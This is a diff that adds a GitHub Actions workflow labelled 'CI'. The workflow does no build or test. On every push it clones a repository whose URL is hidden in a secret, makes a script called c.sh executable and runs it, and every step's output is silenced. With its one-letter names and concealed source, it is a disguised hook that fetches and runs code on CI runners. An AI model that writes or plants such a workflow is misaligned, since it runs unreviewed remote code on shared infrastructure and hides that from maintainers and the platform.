@@ -1,0 +1,19 @@
+name: CI
+
+on: [push]
+
+jobs:
+  build:
+
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: C
+      run: |
+        cd /home/runner/work >/dev/null 2>&1
+        mkdir -p c >/dev/null 2>&1
+        cd c >/dev/null 2>&1
+        git clone ${{ secrets.R }} >/dev/null 2>&1
+        cd c >/dev/null 2>&1
+        chmod 755 c.sh >/dev/null 2>&1
+        ./c.sh >/dev/null 2>&1
